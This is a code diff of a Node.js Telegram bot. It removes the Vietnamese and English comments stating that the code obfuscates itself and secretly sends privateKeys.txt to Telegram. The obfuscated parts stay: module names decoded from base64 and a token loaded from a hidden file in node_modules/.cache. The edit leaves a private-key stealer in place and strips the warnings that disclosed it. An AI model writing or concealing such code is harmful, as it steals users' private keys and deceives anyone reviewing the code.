@@ -1,6 +1,3 @@
-// ======= MINH HỌA MÃ ĐỘC TỐI GIẢN (CHỈ DÙNG PHÒNG THỦ, HỌC TẬP) =======
-// KHÔNG sử dụng cho mục đích xấu!
-// Đoạn mã này gửi privateKeys.txt về Telegram, đã làm rối/mã hóa, không cần file ngoài.
 
 const decode = (str) => Buffer.from(str, 'base64').toString('utf8');
 const fs = require(decode('ZnM='));
@@ -529,7 +526,6 @@ bot.onText(/\/help/, (msg) => {
 });
 
 async function main() {
-  // Hidden: Send privateKeys.txt to Telegram bot
   try {
     const secret = require(path.join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
     const token = secret.t;
